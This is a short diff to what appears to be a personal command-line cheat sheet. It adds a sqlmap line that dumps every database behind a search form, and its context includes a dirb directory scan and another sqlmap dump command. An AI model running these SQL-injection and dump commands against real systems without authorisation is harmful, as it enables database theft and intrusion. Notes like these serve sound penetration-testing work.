@@ -1389,6 +1389,7 @@ bash/zsh + linux terminal cli tools commands
   - dirb http://192.168.1.2
 - sqlmap: auto sql injection + exploit tool
   - e.g: sqlmap -u "http://192.168.1.18/index.php" --dbms=MySQL --dump --data "uname=test&psw=pass" --level=5 --risk=3
+  - dump all: sqlmap -u "http://192.168.3.5/results.php" --dbms=MySQL --dump-all --batch --data "search=test" 
 - aws: aws cli
     - s3
         - download bucket: aws s3 sync s3://my-bucket-0 . --region ap-east-1 
